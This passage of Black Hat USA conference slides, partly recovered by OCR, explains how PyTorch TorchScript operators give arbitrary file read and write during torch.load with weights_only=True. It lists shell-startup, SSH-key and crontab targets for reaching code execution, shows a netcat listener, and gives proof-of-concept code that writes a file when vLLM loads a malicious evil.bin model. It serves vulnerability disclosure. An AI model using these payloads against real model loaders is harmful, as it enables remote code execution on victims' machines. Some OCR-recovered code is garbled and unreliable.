/*archive_dir=*/"",
/*tensor_dir=*/"data/");
\```

\```
convertTypes(module.type());
writeFiles("code/");
\```

\```
data.pkl
Ivalue
\```

\```
code/
python code/debug
info
\```

\```
std::vector<IValue>ivalue_constants(
constant_table_.begin(),constant_table_.end());
\```

\```
...
\```

\```
writeArchive(
c10::ivalue::Tuple::create(ivalue_constants),
/*archive_name=*/"constants",
/*archive_dir=*/"",
/*tensor_dir=*/"constants/");
\```

\```
constants.pkl
tensor
\```

\```
...
\```

\```
}
\```

50

#BHUSA @BlackHatEvents

## Slide 51

###### TorchScript Serialization -- save

\```
ForTorchFunction, firstconvertittoTorchModule, the remaining process is
the same
\```

- `1.The ivalue corresponding to the module is serialized in pickle format as data.pkl.`

- `2.Obtain code and debug info via PythonPrint, and write to code/ directory`

- `3.Save tensor constants to constants.pkl`

51

#BHUSA @BlackHatEvents

## Slide 52

###### TorchScript Serialization – inside serialized pt file

\```
module
├──byteorder
├──code
│├──__torch__.py
│└──__torch__.py.debug_pkl
├──constants.pkl
├──data.pkl
└──version
\```

\```
0: \x80 PROTO      2
2: c    GLOBAL     '__torch__PlaceholderModule'
31: q    BINPUT     0
33: )    EMPTY_TUPLE
34: \x81 NEWOBJ
35: }    EMPTY_DICT
36: (    MARK
37: X        BINUNICODE 'training'
50: q        BINPUT     1
52: \x88     NEWTRUE
53: u        SETITEMS   (MARK at 36)
54: b    BUILD
55: q    BINPUT     2
57: .    STOP
\```

\```
module.pt
\```

###### `data.pkl`

52

#BHUSA @BlackHatEvents

## Slide 53

###### TorchScript Serialization – inside serialized pt file

\```
0: \x80 PROTO      2
2: )    EMPTY_TUPLE
3: .    STOP
\```

\```
classPlaceholderModule(Module):
__parameters__=[]
__buffers__=[]
training:bool
defforward(self:__torch__.PlaceholderModule,
x:Tensor)->Tensor:
ifbool(torch.gt(torch.sum(x),0)):
y=torch.mul(x,2)
else:
y=torch.add(x,2)
returny
\```

\```
constants.pkl
\```

\```
code/__torch__.py
\```

53

#BHUSA @BlackHatEvents

## Slide 54

###### TorchScript Serialization -- load

\```
constants.pkl
tensor
\```

tensor
data.pkl
Ivalue
code/
python code/debug
info

\```
ScriptModuleDeseria
ScriptModule
lizer::deserialize
\```

54 #BHUSA @BlackHatEvents

## Slide 55

###### TorchScript Serialization -- load

\```
constants.pkl
tensor
\```

\```
data.pkl
Ivalue
\```

\```
code/
python code/debug
info
\```

\```
ModuleScriptModuleDeserializer::deserialize(
std::optional<at::Device>device,
ExtraFilesMap&extra_files,
boolrestore_shapes){
...
autotuple=readArchive("constants").toTuple();
for(autoconstant:tuple->elements()){
constants_table_.push_back(constant.toIValue());
}
autom_ivalue=readArchive("data");
autom=Module(m_ivalue.toObject());
...
returnm;
}
\```

55

#BHUSA @BlackHatEvents

## Slide 56

###### TorchScript Serialization -- load

\```
constants.pkl
ModuleScriptModuleDeserializer::deserialize(
tensor
std::optional<at::Device>device,
ExtraFilesMap&extra_files,
boolrestore_shapes){
...
autotuple=readArchive("constants").toTuple();
for(autoconstant:tuple->elements()){
Unpickling
constants_table_.push_back(constant.toIValue());
}
autom_ivalue=readArchive("data");
autom=Module(m_ivalue.toObject());
...
returnm;
constants_table_}
Ivalue
\```

56

#BHUSA @BlackHatEvents

## Slide 57

###### TorchScript Serialization -- load

data.pkl
Ivalue
code/
python code/debug
info
constants_table_
Ivalue

\```
ModuleScriptModuleDeserializer::deserialize(
std::optional<at::Device>device,
ExtraFilesMap&extra_files,
boolrestore_shapes){
...
autotuple=readArchive("constants").toTuple();
for(autoconstant:tuple->elements()){
constants_table_.push_back(constant.toIValue());
}
autom_ivalue=readArchive("data");
autom=Module(m_ivalue.toObject());
...
returnm;
}
Unpicklingand import
code
\```

Token
JIT AST
IR

57

#BHUSA @BlackHatEvents

## Slide 58

###### TorchScript Serialization -- load

- `Reach main logic via ScriptModuleDeserializer::deserialize`

- `Call readArchive to read constants.pkl, convert constants to IValues by unpickling and save them to constants_table_`

- `Call readArchive to read data.pkl, restore corresponding IValues by unpickling`

- `During data.pkl unpickling, SourceImporter reads code files and constants_table_ to restore IR through parseType->findNamedType>importNamedType`

58

#BHUSA @BlackHatEvents

## Slide 59

###### TorchScript Execution -- Node

###### `Node format`

\```
optimizedIRgraph
\```

\```
input
\```

\```
outputop
\```

\```
graph(%x.1 : Tensor):
%12 : int = prim::Constant[value=1]()
%2 : NoneType = prim::Constant()
%4 : int = prim::Constant[value=0]() #  poc.py:5:14
%9 : int = prim::Constant[value=2]() #  poc.py:6:10
%3 : Tensor = aten::sum(%x.1, %2) #  poc.py:5:4
%5 : Tensor = aten::gt(%3, %4) #  poc.py:5:4
%7 : bool = aten::Bool(%5) #  poc.py:5:4
%y : Tensor = prim::If(%7) #  poc.py:5:1
block0():
%y.1 : Tensor = aten::mul(%x.1, %9) #  poc.py:6:6
-> (%y.1)
block1():
%y.3 : Tensor = aten::add(%x.1, %9, %12) #  poc.py:8:6
-> (%y.3)
return (%y)
\```

59

#BHUSA @BlackHatEvents

## Slide 60

###### TorchScript Execution

\```
boolrunTemplate(Stack&stack){
\```

invokeScriptMethodF
romPython

GraphFunction::
run
emit IR to
Instruction
InterpreterStateImpl::
runTemplate
Interpret
Instruction

\```
...
try{
while(true){
Frame&frame=frames.back();
...
switch(inst.op){
caseINST(ENTER):{
[[maybe_unused]]auto_=instGuard();
constauto&obj=peek(stack,0,1);
TORCH_INTERNAL_ASSERT(obj.isObject());
entered_objects.push_back(obj);
}
INST_NEXT;
\```

\```
...
caseINST(OP):{
[[maybe_unused]]auto_=instGuard();
autostackSizeGuard=stackSizeAssertGuard();
frame.function->operator_table_[inst.X](stack);
stackSizeGuard.callAssert();
\```

\```
}
\```

\```
...
\```

60

#BHUSA @BlackHatEvents

## Slide 61

###### TorchScript Execution

\```
WhatisOPinstruction?
\```

\```
Whatabout the callee?
\```

\```
boolrunTemplate(Stack&stack){
...
try{
while(true){
Frame&frame=frames.back();
...
switch(inst.op){
caseINST(ENTER):{
[[maybe_unused]]auto_=instGuard();
constauto&obj=peek(stack,0,1);
TORCH_INTERNAL_ASSERT(obj.isObject());
entered_objects.push_back(obj);
}
INST_NEXT;
...
caseINST(OP):{
[[maybe_unused]]auto_=instGuard();
autostackSizeGuard=stackSizeAssertGuard();
frame.function->operator_table_[inst.X](stack);
stackSizeGuard.callAssert();
}
...
\```

61

#BHUSA @BlackHatEvents

## Slide 62

###### TorchScript Operators

- `Some built-in functions register themselves as Operators, requiring OP instructions to call corresponding functions.`

- `The RegisterOperators class manages these Operators, and register them by registerOperator function.`

62

#BHUSA @BlackHatEvents

## Slide 63

###### TorchScript Operators

- `Some built-in functions register themselves as Operators, requiring OP instructions to call corresponding functions.`

- `The RegisterOperators class manages these Operators, and register them by registerOperator function.`

\```
Are these operators safe?
\```

63

#BHUSA @BlackHatEvents

## Slide 64

###### TorchScript Operators

\```
"prim::PythonOp",
"aten::has_torch_function",
"aten::is_scripting",
"aten::as_tensor",
"aten::tensor",
"prim::TimePoint",
"prim::AddStatValue",
"prim::awaitable_nowait",
"prim::awaitable_wait",
"aten::wait",
What are these?
"prim::IgnoredPythonOp",
"aten::save",
...
"aten::from_file",
...
\```

64

#BHUSA @BlackHatEvents

## Slide 65

###### TorchScript Operators

|`write file`
`Operator(`
`"aten::save(t item, str filename) -> ()",`
`[](Stack& stack) {`
`auto filename = pop(stack).toStringRef();`
`auto ivalue = pop(stack);`
`// Pickle the tensor`
`auto data = jit::pickle_save(ivalue);`
`// Write file`
`std::fstream output(filename, std::ios::out |`
`std::ios::binary);`
`output.write(data.data(), data.size());`
`},`
`aliasAnalysisFromSchema()),`|`Tensor from_file(`
`std::string_view filename,`
`std::optional<bool> shared,`
`std::optional<int64_t> size,`
`...`
`int64_t my_size = size.value_or(0);`
`int flags = shared.value_or(false) ? ALLOCATOR_MAPPED_SHARED : 0;`
`auto my_dtype = options.dtype();`
`size_t size_bytes = my_size * my_dtype.itemsize();`
`auto storage_impl = c10::make_intrusive<at::StorageImpl>(`
`c10::StorageImpl::use_byte_size_t(),`
`size_bytes,`
`MapAllocator::makeDataPtr(`
`std::string(filename), flags, size_bytes, nullptr),`
`/*allocator=*/nullptr,`
`/*resizable=*/false);`
`auto tensor = detail::make_tensor<at::TensorImpl>(`
`storage_impl, at::DispatchKey::CPU, my_dtype);`
`tensor.unsafeGetTensorImpl()->set_sizes_contiguous({my_size});`
`return tensor;`
`}`
`read file`|
|---|---|

65

#BHUSA @BlackHatEvents

## Slide 66

###### TorchScript Operators

###### `write file`

###### `read file`

\```
Tensorfrom_file(
Operator(std::string_viewfilename,
"aten::save(titem,strfilename)->()",std::optional<bool>shared,
[](Stack&stack){std::optional<int64_t>size,
...
autofilename=pop(stack).toStringRef();
autoivalue=pop(stack);int64_tmy_size=size.value_or(0);
intflags=shared.value_or(false)?ALLOCATOR_MAPPED_SHARED:0;
//PicklethetensorHow to call them from TorchScript?automy_dtype=options.dtype();
autodata=jit::pickle_save(ivalue);size_tsize_bytes=my_size*my_dtype.itemsize();
autostorage_impl=c10::make_intrusive<at::StorageImpl>(
//Writefilec10::StorageImpl::use_byte_size_t(),
std::fstreamoutput(filename,std::ios::out|size_bytes,
std::ios::binary);MapAllocator::makeDataPtr(
output.write(data.data(),data.size());std::string(filename),flags,size_bytes,nullptr),
},/*allocator=*/nullptr,
aliasAnalysisFromSchema()),/*resizable=*/false);
autotensor=detail::make_tensor<at::TensorImpl>(
storage_impl,at::DispatchKey::CPU,my_dtype);
tensor.unsafeGetTensorImpl()->set_sizes_contiguous({my_size});
returntensor;
}
\```

66

#BHUSA @BlackHatEvents

## Slide 67

###### TorchScript Operators

\```
_modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
\```

\```
#lazilybuilttoensurethecorrectinitializationorder
def_get_builtin_table():
...
defregister_all(mod):
fornameindir(mod):
v=getattr(mod,name)
if(
callable(v)
andnot_is_special_functional_bound_op(v)
):
_builtin_ops.append((v,"aten::"+name))
\```

\```
formodin_modules_containing_builtins:
register_all(mod)
...
forbuiltin,aten_opin_builtin_ops:
_builtin_table[id(builtin)]=aten_op
\```

\```
return_builtin_table
\```

\```
def_find_builtin(fn):
return_get_builtin_table().get(id(fn))
\```

67

#BHUSA @BlackHatEvents

## Slide 68

###### TorchScript Operators

\```
_modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
#lazilybuilttoensurethecorrectinitializationorder
def_get_builtin_table():
\```

\```
...
defregister_all(mod):
fornameindir(mod):
v=getattr(mod,name)
if(
callable(v)
andnot_is_special_functional_bound_op(v)
):
_builtin_ops.append((v,"aten::"+name))
\```

- `Iterate through module attributes`

- `Get the actual attribute object`

- `Check if the attribute is callable`

- `Register address and new name of the operator`

\```
formodin_modules_containing_builtins:
register_all(mod)
...
forbuiltin,aten_opin_builtin_ops:
_builtin_table[id(builtin)]=aten_op
\```

\```
return_builtin_table
\```

\```
def_find_builtin(fn):
return_get_builtin_table().get(id(fn))
\```

68

#BHUSA @BlackHatEvents

## Slide 69

###### TorchScript Operators

\```
#lazilybuilttoensurethecorrectinitializationorder
def_get_builtin_table():
\```

\```
...
defregister_all(mod):
fornameindir(mod):
v=getattr(mod,name)
if(
callable(v)
andnot_is_special_functional_bound_op(v)
):
_builtin_ops.append((v,"aten::"+name))
\```

\```
formodin_modules_containing_builtins:
register_all(mod)
...
forbuiltin,aten_opin_builtin_ops:
_builtin_table[id(builtin)]=aten_op
\```

\```
std::shared_ptr<SugaredValue>toSugaredValue(
py::objectobj,
GraphFunction&m,
constSourceRange&loc,
boolis_constant){
\```

\```
...
py::objectbuiltin_name=
py::module::import("torch.jit._builtins").attr("_find_builtin")(obj);
if(!builtin_name.is_none()){
returnstd::make_shared<BuiltinFunction>(
Symbol::fromQualString(py::str(builtin_name)),std::nullopt);
\```

\```
}
...
\```

\```
return_builtin_table
\```

\```
def_find_builtin(fn):
return_get_builtin_table().get(id(fn))
\```

69

#BHUSA @BlackHatEvents

## Slide 70

###### TorchScript Operators

\```
#lazilybuilttoensurethecorrectinitializationorder
def_get_builtin_table():
\```

\```
...
defregister_all(mod):
\```

\```
fornameindir(mod):
v=getattr(mod,name)
if(
callable(v)
andnot_is_special_functional_bound_op(v)
):
\```

\```
_builtin_ops.append((v,"aten::"+name))
\```

\```
formodin_modules_containing_builtins:
register_all(mod)
...
\```

\```
forbuiltin,aten_opin_builtin_ops:
_builtin_table[id(builtin)]=aten_op
return_builtin_table
\```

\```
def_find_builtin(fn):
return_get_builtin_table().get(id(fn))
\```

###### `emitBuiltinCall`

\```
std::shared_ptr<SugaredValue>toSugaredValue(
py::objectobj,
GraphFunction&m,
constSourceRange&loc,
boolis_constant){
...
py::objectbuiltin_name=
py::module::import("torch.jit._builtins").attr("_find_builtin")(obj);
if(!builtin_name.is_none()){
returnstd::make_shared<BuiltinFunction>(
Symbol::fromQualString(py::str(builtin_name)),std::nullopt);
}
...
\```

\```
std::shared_ptr<SugaredValue>emitApplyExpr(
Apply&apply,
size_tn_binders,
constTypePtr&type_hint=nullptr){
autosv=emitSugaredExpr(apply.callee(),1);
autoloc=apply.callee().range();
...
autoargs=getNamedValues(apply.inputs(),true);
autokwargs=emitAttributes(apply.attributes());
returnsv->call(loc,method,args,kwargs,n_binders);
}
\```

70

#BHUSA @BlackHatEvents

## Slide 71

###### TorchScript Operators

\```
_modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
\```

\```
#lazilybuilttoensurethecorrectinitializationorder
def_get_builtin_table():
...
defregister_all(mod):
fornameindir(mod):
v=getattr(mod,name)
if(
callable(v)
andnot_is_special_functional_bound_op(v)
):
_builtin_ops.append((v,"aten::"+name))
formodin_modules_containing_builtins:
register_all(mod)
...
forbuiltin,aten_opin_builtin_ops:
_builtin_table[id(builtin)]=aten_op
\```

\```
aten::save=
\```

\```
torch.save
torch._C._nn.save
torch._C._fft.save
torch._C._linalg.save
torch._C._nested.save
torch._C._sparse.save
torch._C._special.save
\```

\```
return_builtin_table
def_find_builtin(fn):
return_get_builtin_table().get(id(fn))
\```

71

#BHUSA @BlackHatEvents

## Slide 72

###### TorchScript Operators

\```
We just need to call torch.saveor torch.from_fileto
get arbitrary file read/write ability in TorchScript.
\```

\```
@torch.jit.script
defread_file(x:torch.Tensor):
returntorch.from_file('/file/path',dtype=torch.long,size=100)
#readthetensortrytogetactualword
\```

\```
@torch.jit.script
defwrite_file(x:torch.Tensor):
returntorch.save("xxx","/file/path")
#willwritedirtycharacters
\```

72

#BHUSA @BlackHatEvents

## Slide 73

###### Write File to RCE

\```
.zshrc
\```

\```
.ssh/authorized_keys
.cshrc
\```

\```
.bashrc
\```

\```
.config/fish/config.fish
.profile
\```

73

#BHUSA @BlackHatEvents

## Slide 74

###### Write File to RCE

\```
centos crontabubuntu crontab
\```

###### 🧐 `Why ubuntu crontab failed?`

74

#BHUSA @BlackHatEvents

## Slide 75

###### POC Video

75 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
POC Video
[root@iZjéch4zpf21z7bfea7y2nZ ~]# nc —lvn 8000)
75
```

## Slide 76

76 #BHUSA @BlackHatEvents

## Slide 77

###### Heap Overflow

77

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Heap Overflow
exp.py model.pt
root@iZjéc84h3p7hxdvzrrsn30Z:~/exp# cat exp.py
import_torch
model()
root@iZjéc84h3p7hxdvzrrsn3@Z:~/exp# python3 exp.py
/usr/local/1lib/python3.10/dist-packages/torch/_subclasses/functional_tensor.py:295: U
serWarning: Failed to initialize NumPy: No module named 'numpy' (Triggered internally
at ../torch/csrc/utils/tensor_numpy.cpp:84. )
cpu = _conversion_method_template(device=torch.device("cpu") )
/usr/local/lib/python3.10/dist-packages/torch/serialization.py:1328: UserWarning: 'to
rch.load' received a zip file that looks like a TorchScript archive dispatching to 't
orch.jit.load' (call 'torch.jit.load' directly to silence this warning)
warnings.warn(
77
```

## Slide 78

###### POC Video

78 #BHUSA @BlackHatEvents

## Slide 79

###### This Is CVE-2025-32434!

79 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
This Is CVE-2025-32434!
Description
PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based
autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using
torch.load with weights_only=True. This issue has been patched in version 2.6.0.
Metrics CVSS Version 4.0 CVSS Version 3.x CVSS Version 2.0
NVD enrichment efforts reference publicly available information to associate vector strings. CVSS information contributed by other sources is also displayed.
CVSS 4.0 Severity and Vector Strings:
@ NIST: NVD
i CNA: GitHub, Inc. cvss-B EE
NVD assessment not yet provided.
Vector:
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/S
A:N
79
```

## Slide 80

#BHUSA @BlackHatEvents
https://github.com/pytorch/pytorch/pull/143326/files
Patch
80

## Slide 81

#### The Impact

81

#BHUSA @BlackHatEvents

## Slide 82

###### A Shaky Base, a Shaken Ecosystem

82 #BHUSA @BlackHatEvents

## Slide 83

###### Codes Using weights_only

83

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Codes Using weights_only
= © Q weights_only=True
Filter by 85k files (311 ms)
| <> Code 85k Y © antgroup/echomimic_v2 - app.py
a Repositories uo 60 reference_unet. load_state_dict(torch. load("./pretrained_weights/reference_unet.pth", weights_only=True) )
102 .. denoising_unet. load_state_dict(torch. load("./pretrained_weights/denoising_unet.pth", weights_only=True) ,strict=False
© Issues 1k d isi load. dict( h. Load (" ined. ights/d isi h" igh L ) i lse)
3 Pull requests 1k 106 pose_net. load_state_dict(torch. load("./pretrained_weights/pose_encoder.pth", weights_only=True) )
Q) Discussions 82
AX Users i) Y @ divamgupta/image-segmentation-keras - README.md
v More 429 callbacks = [
430 ModelCheckpoint (
Languages 431 filepath="checkpoints/" + model.name + ".{epoch:@5d}",
432 save_weights_only=True,
@ Python 433 verbose=True
@ Markdown ne ),
435 EarlyStopping()
@ Text
@ reStructuredText ;
v © kdaiP/StableTTS - api.py
@ RMarkdown
29 vocoder = Vocos(VocosConfig(), MelConfig())
® More languages... 30 vocoder. load_state_dict(torch. load(model_path, weights_only=True, map_location='cpu'))
31 vocoder.eval()
Repositories 48 self.tts_model = StableTTS(len(symbols), self.mel_config.n_mels, *xasdict(self.tts_model_config) )
3) KdaiP/StableTTS 49 self.tts_model. load_state_dict(torch. load(tts_model_path, map_location='cpu', weights_only=True) )
50 self.tts_model.eval()
@ antgroup/echomimic_v2
83
#BHUSA @BlackHatEvents
```

## Slide 84

###### Exploit Two of the Most Famous Projects

84

#BHUSA @BlackHatEvents

## Slide 85

85 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Easy, fast, and cheap LLM serving for everyone
| Documentation | Blog | Paper | Twitter/X | User Forum | Developer Slack |
85
```

## Slide 86

###### CVE-2025-24357

86 #BHUSA @BlackHatEvents

https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2025-24357
Malicious model to RCE by torch.load in hf_model_weights_iterator
russellb published GHSA-rh4j-5rhw-hr54 on Jan 28
Package Affected versions Patched versions Severity
@ vilm (pip) <= 0.7.0 v0.7.0 7.5 110
CVSS v3 base metrics
Description Attack vector Network
Attack complexity High
Description Privileges required None
User interaction Required
The vilm/model_executor/weight_utils.py implements hf_model_weights_iterator to load the model checkpoint, which is
downloaded from huggingface] It use torch.load function and weights_only parameter is default value False. There is a security peop Unehanged
warning on https://pytorch.org/docs/stable/generated/torch.load.html, when torch.load load a malicious pickle data it will execute Confidentiality High
arbitrary code during unpickling. Integrity High
Availability High
Impact
Learn more about base metrics
This vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained
repo remotely.
Note that most models now use the safetensors format, which is not vulnerable to this issue. CVE ID
CVE-2025-24357
86
https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54
```

## Slide 87

###### Patch

87

#BHUSA @BlackHatEvents

https://github.com/vllm-project/vllm/pull/12366


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Patch
@ russellb authored and Russell Bryant committed on Jan 24
26
27
28
29
273
274
275
276
26
28
29
vllm/assets/image. py (DO
@@ -26,4 +26,4 @@ def image_embeds(self) -> torch.Tensor:
image_path = get_vllm_public_assets(filename=f"{self.name}.pt",
s3_prefix=VLM_IMAGES_DIR)
return torch. load(image_path, map_location="cpu")
return torch. load(image_path, map_location="cpu", weights_only=True)
273
274
275
276
277
@@ -273,7 +273,8 @@ def from_local_checkpoint(
new_embeddings_tensor_path)
elif os.path.isfile(new_embeddings_bin_file_path):
embeddings = torch. load(new_embeddings_bin_file_path,
map_location=device)
map_location=device,
weights_only=True)
87
```

## Slide 88

###### Safe Harbor or Hostile Waters

88 #BHUSA @BlackHatEvents

## Slide 89

###### 🤠 One More Interesting Observation

89

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
One More Interesting Observation
= ©) vilm-project / vilm
<> Code ©) Issues 1.2k 3 Pullrequests 502 () Discussions ©) Actions © Security 2 |~ Insights
npanpaliya [CPU][PPC] Updated torch, torchvision, torchaudio dependencies (#12555) Gp X
Blame 15 lines (12 loc) + 689 Bytes
1 # Common dependencies
2 -r requirements—common. txt
3
4 # Dependencies for CPUs
5 torch==2.5.1+cpu; platform_machine != "ppc64le" and platform_machine != "aarch64" and platform_system != "Darwin"
6 torch==2.5.1; platform_machine == "ppc64le" or platform_machine == “aarch64" or platform_system == "Darwin"
=
89
#BHUSA @BlackHatEvents
```

## Slide 90

###### 🤠 One More Interesting Observation

90 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
& One More Interesting Observation
ws) vilm-project / vilm
<> Code ©) Issues 1.2k $4 Pullrequests 502 1) Discussions ©) Actions © Security 2
PD & main ~ — vilm/requirements-cuda.txt (2
») 35 people [Model] Refactoring of MiniCPM-V and add MiniCPM-o-2.6 support for vL.. Gm xX
Blame 11 lines (10 loc) + 483 Bytes
# Common dependencies
# Dependencies for NVIDIA GPUs
ray[default] >= 2.9
nvidia-ml-py >= 12.560.30 # for pynvml package
torch == 2.5.1
torchaudio==2.5.1 90
#BHUSA @BlackHatEvents
```

## Slide 91

###### 🤣 `The PyTorch Version Is Hardcoded`

91 #BHUSA @BlackHatEvents

## Slide 92

###### Environment Setup

92 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment Setup
(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project# pip3 install vllm==0.7.3
Collecting vllm==0.7.3
Obtaining dependency information for vllm==0.7.3 from
Downloading vllm-0.7.3-cp38-abi3-manyLinux1_x86_64.whl.metadata (25 kB)
Collecting psutil (from vllm==0.7.3)
Obtaining dependency information for psutil from
Collecting torch==2.5.1 (from vllm==0.7.3)
Obtaining dependency information for torch==2.5.1 from
Downloading torch-2.5.1-cp310-cp310-manylLinux1_x86_64.whl.meta
Collecting torchaudio==2.5.1 (from vllm==0.7.3)
Obtaining dependency information for torchaudio==2.5.1 from
92
```

## Slide 93

###### The Vulnerable Function

93

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The Vulnerable Function
10
14
def pt_weights_iterator(
hf_weights_files: List[str]
) -> Generator[Tuple[str, torch.Tensor], None, None]:
"'"TIterate over the weights in the model bin/pt files.
enable_tqdm = not torch.distributed.is_initialized()
or
for bin_
torch.distributed.get_rank() ==
file in tqdm(
hf_weights_files,
desc="Loading pt checkpoint shards",
disable=not enable_tqdm,
bar_
state =
format=_BAR_FORMAT,
torch. load(bin_file, map_location="cpu", weights_only=True)
yield from state. items()
del state
93
```

## Slide 94

###### One Shot, One Kill?

94 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
One Shot, One Kill?
import torch
import torch.nn as nn from vllm.model_executor.model_loader import weight_utils
class SimpleModel(nn.Module) : for i in weight_utils.pt_weights_iterator(['evil.bin']):
def _ init__(self): print(i)
def forward(self):
torch.save("test\n", "/tmp/1.txt")
2 model = SimpleModel()
model_script = torch.jit.script(model) a aa
) -> Generator[Tuplel , torch.Tensor], None, None]:
enable_tqdm = not torch.distributed.is_initialized(
) or torch.distributed.get_rank() == 0
for bin_file in tqdm(
hf_weights_files,
="Loading pt checkpoint st
=not enable_tqdm,
=_BAR_FORMAT,
yield from state.items()
del state
```

## Slide 95

###### 😭 But It Failed, Why?

95 #BHUSA @BlackHatEvents

## Slide 96

###### Previous PoC

96

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Previous PoC
import torch
import torch.nn as nn
1
2
3
4 class SimpleModel(nn.Module) :
5 def _ init__(self):
6
7
8
9
super(SimpleModel, self).__init__() 1 import torch
2 model = torch. load('evil.bin', weights_only=True)
torch.save("test\n", "/tmp/1.txt")
10 return torch. zeros(Q) 4 model()
12 model = SimpleModel()
14 model_script.save("evil.bin")
96
```

## Slide 97

###### The Key to Failure

- 😲 `The model was not invoked`

97

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
10
12
14
The Key to Failure
def pt_weights_iterator(
hf_weights_files: List[str]
) -> Generator[Tuple[str, torch.Tensor], None, None]:
"""Tterate over the weights in the model bin/pt files."""
enable_tqdm = not torch.distributed.is_initialized()
or torch.distributed.get_rank() ==
for bin_file in tqdm(
hf_weights_files, ZA
desc="Loading pt checkpoint shards",
disable=not enable_tqdm,
bar_format=_BAR_FORMAT,
state = torch. load(bin_file, map_location="cpu", weights_only=True)
del state
“~ The model was not invoked
97
```

## Slide 98

###### Is This Really the End?

98 #BHUSA @BlackHatEvents

## Slide 99

###### Learn From the Exception

99

#BHUSA @BlackHatEvents

## Slide 100

###### items()

100

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
items()
2 for key, value in my_dict.items():
3
2,
‘er: 3}
1 class dict(object):
dict() -> new empty dictionary
dict(mapping) -> new dictionary initialized from a mapping object's
(key, value) pairs
dict(iterable) -> new dictionary initialized as if via:
for k, v in iterable:
d{k] =v
dict(*«kwargs) -> new dictionary initialized with the name=value pairs
in the keyword argument list. For example: dict(one=1, two=2)
def items(self): # real signature unknown; restored from __doc__
mun DP items() -> a set-like object providing a view on D's items
pass
100
```

## Slide 101

🤔 `Can we spoof the function name?`

101 #BHUSA @BlackHatEvents

## Slide 102

###### First Attempt – Failed

102 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
First Attempt - Failed
import torch
import torch.nn as nn
class SimpleModel(nn.Module):
super(SimpleModel, self).__init__()
def items(self):
torch.save("test\n", "/tmp/1.txt")
model = SimpleModel()
> model_script = torch.jit.script(model)
model_script.save("evil.bin")
```

## Slide 103

###### Second Attempt – Succeeded

103

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Second Attempt - Succeeded
import torch
import torch.nn as nn
class SimpleModel(nn.Module) :
def __ init__(self):
def items(self):
torch.save("test\n", "/tmp/1.txt")
def forward(self):
self.items()
model = SimpleModel()
(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# ls /tmp/1.txt
ls: cannot access '/tmp/1.txt': No such file or directory
(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# python3 exp.py
INFO 06-20 10:21:43 __init__.py:211] No platform detected, vLLM is running on UnspecifiedPlatform
Loading pt checkpoint shards: 0% Completed | 0/1 [00:00<?, ?it/s]
/root/tmp_python_project/.venv/lib/python3.10/site-packages/torch/serialization.py:1328: UserWarning:
chive dispatching to 'torch.jit.load' (call 'torch.jit.load' directly to silence this warning)
warnings.warn(
Loading pt checkpoint shards: 100% Completed | 1/1 [00:00<00:00, 16.99it/s]
(.venv) root@iZj6écit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# cat /tmp/1.txt
103
```

## Slide 104

###### Why?

class FunctionModifiers:
"""
Used to denote the behavior of a function in TorchScript. See export() and
ignore() for details.
"""
UNUSED = "unused (ignored and replaced with raising of an exception)"
IGNORE = "ignore (leave as a call to Python, cannot be torch.jit.save'd)"
EXPORT = "export (compile this function even if nothing calls it)"
